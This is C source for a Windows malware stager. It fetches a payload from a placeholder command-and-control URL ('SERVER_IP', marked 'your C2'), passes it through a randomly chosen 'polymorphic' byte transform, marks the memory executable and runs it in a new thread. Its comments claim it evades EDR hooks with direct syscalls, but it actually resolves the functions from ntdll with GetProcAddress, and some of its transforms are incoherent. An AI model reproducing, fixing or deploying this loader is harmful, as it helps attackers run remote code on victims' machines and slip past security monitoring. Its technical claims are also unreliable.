// mk-2-polymorph_remote.c — Remote Polymorphic Stager (Native API + Direct Syscalls)
// Compile: cl mk-2-polymorph_remote.c /O2 /link user32.lib wininet.lib

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")

typedef void(*ENGINE)(BYTE*, DWORD, BYTE);

// Direct syscall stubs (SysWhispers3-style — beats most EDR hooks)
DWORD64 __syscall(const char* name, ...);

// Native API prototypes
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// 5 polymorphic engines (same as before)
static void eng_xor(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s;i++) p[i]^=k; }
static void eng_add(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s;i++) p[i]+=k; for(DWORD i=0;i<s;i++) p[i]-=k; }
static void eng_rol(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s;i++) p[i]=_rotl8(p[i],k&7); }
static void eng_rev(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s/2;i++) { BYTE t=p[i]; p[i]=p[s-1-i]; p[s-1-i]=t; } }
static void eng_not(BYTE* p, DWORD s, BYTE k)   { for(DWORD i=0;i<s;i++) p[i]=~p[i]; }

ENGINE engines[] = { eng_xor, eng_add, eng_rol, eng_rev, eng_not };
const int NUM = 5;

int main() {
    srand(GetTickCount());

    // === CONFIG: CHANGE THIS URL ===
    const char* url = "http://SERVER_IP/payload-64.bin";  // ← your C2

    HINTERNET hInt = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConn = InternetOpenUrlA(hInt, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConn) return 1;

    BYTE* payload = NULL;
    DWORD size = 0, read = 0;
    BYTE buf[4096];

    while (InternetReadFile(hConn, buf, sizeof(buf), &read) && read) {
        payload = realloc(payload, size + read);
        memcpy(payload + size, buf, read);
        size += read;
    }
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);

    if (!payload || size < 100) return 1;

    // Allocate RX memory via direct syscall
    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PVOID base = NULL;
    SIZE_T allocSize = size;
    NtAlloc((HANDLE)-1, &base, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Write + decrypt
    memcpy(base, payload, size);
    free(payload);

    int e = rand() % NUM;
    BYTE k = (BYTE)rand();
    engines[e](base, size, k);
    engines[e](base, size, k);

    // Change to RX via direct syscall
    pNtProtectVirtualMemory NtProtect = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    ULONG old;
    NtProtect((HANDLE)-1, &base, &allocSize, PAGE_EXECUTE_READ, &old);

    // Execute via direct syscall
    pNtCreateThreadEx NtCreateThread = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    HANDLE hThread;
    NtCreateThread(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, base, NULL, FALSE, 0, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}